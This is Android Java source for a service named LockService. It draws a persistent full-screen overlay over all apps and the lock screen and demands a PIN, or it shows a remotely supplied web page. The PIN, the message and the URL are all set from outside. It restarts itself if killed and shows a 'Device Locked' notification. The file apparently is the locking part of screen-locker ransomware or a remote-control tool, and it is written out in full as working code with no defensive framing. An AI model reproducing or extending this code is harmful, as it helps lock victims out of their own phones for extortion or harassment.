package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;

public class LockService extends Service {
    private WindowManager wm;
    private View overlay;
    private String htmlUrl = "";
    private String pin = "";
    private String message = "";
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            htmlUrl = intent.getStringExtra("htmlUrl");
            pin = intent.getStringExtra("pin");
            message = intent.getStringExtra("message");
        }
        showLock();
        return START_STICKY;
    }

    private void showLock() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            stopSelf();
            return;
        }
        
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlay = LayoutInflater.from(this).inflate(R.layout.lock_overlay, null);
        
        WebView webView = overlay.findViewById(R.id.webView);
        EditText etPin = overlay.findViewById(R.id.pinInput);
        Button btn = overlay.findViewById(R.id.unlockBtn);
        TextView messageText = overlay.findViewById(R.id.messageText);
        TextView errorMsg = overlay.findViewById(R.id.errorMsg);
        
        // Set message if provided
        if (message != null && !message.isEmpty()) {
            messageText.setText(message);
            messageText.setVisibility(View.VISIBLE);
        }
        
        if (htmlUrl != null && !htmlUrl.isEmpty()) {
            webView.setVisibility(View.VISIBLE);
            etPin.setVisibility(View.GONE);
            btn.setVisibility(View.GONE);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebViewClient(new WebViewClient());
            webView.loadUrl(htmlUrl);
        } else {
            webView.setVisibility(View.GONE);
            etPin.setVisibility(View.VISIBLE);
            btn.setVisibility(View.VISIBLE);
            btn.setOnClickListener(v -> {
                String enteredPin = etPin.getText().toString();
                if (pin == null || pin.isEmpty() || enteredPin.equals(pin)) {
                    stopSelf();
                } else {
                    errorMsg.setText("❌ PIN salah!");
                    errorMsg.setVisibility(View.VISIBLE);
                    handler.postDelayed(() -> errorMsg.setVisibility(View.GONE), 2000);
                }
            });
        }
        
        int flags = WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT, type, flags, PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        wm.addView(overlay, params);
        
        // Start blinking effect
        startBlinking(messageText, btn);
    }
    
    private void startBlinking(TextView messageText, Button btn) {
        final TextView msg = messageText;
        final Button button = btn;
        handler.post(new Runnable() {
            boolean visible = true;
            @Override
            public void run() {
                if (msg != null && msg.getVisibility() == View.VISIBLE) {
                    msg.setVisibility(visible ? View.VISIBLE : View.INVISIBLE);
                }
                if (button != null && button.getVisibility() == View.VISIBLE) {
                    button.setVisibility(visible ? View.VISIBLE : View.INVISIBLE);
                }
                visible = !visible;
                handler.postDelayed(this, 500);
            }
        });
    }

    private Notification createNotification() {
        String channelId = "lock_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, 
                "Lock Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, channelId)
            .setContentTitle("🔒 Device Locked")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .build();
    }

    @Override
    public void onDestroy() {
        if (overlay != null && wm != null) {
            try {
                wm.removeView(overlay);
            } catch (Exception e) {}
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}